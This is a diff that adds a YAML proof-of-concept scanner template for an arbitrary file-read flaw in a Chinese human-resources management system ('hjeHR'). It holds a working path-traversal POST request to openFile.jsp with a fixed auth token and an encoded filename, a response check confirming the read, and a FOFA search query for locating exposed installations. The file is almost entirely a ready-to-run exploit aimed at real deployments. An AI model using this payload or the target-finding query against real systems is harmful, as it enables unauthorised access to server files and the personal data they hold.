@@ -1,0 +1,25 @@
+name: poc-yaml-hjeHR-openFile-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /templates/attestation/../../general/muster/hmuster/openFile.jsp
+      headers:
+        x-auth-token: d9eaeacd5de1008fd43f737c853dcbcb
+        Content-Type: application/x-www-form-urlencoded
+
+      body: filename=8uHo1M8Ok6bZ468mKmzw70ounZHwKUWnpVOrvOAV6WoPAATTP3HJDPAATTP
+    expression: response.status == 200 && response.body.bcontains(b'<?xml version="1.0" encoding="UTF-8"?>')
+
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139577706
+
+# fofa: body="<div class=\"hj-hy-all-one-logo\"" || title="人力资源信息管理系统" || body="/general/sys/hjaxmanage.js"
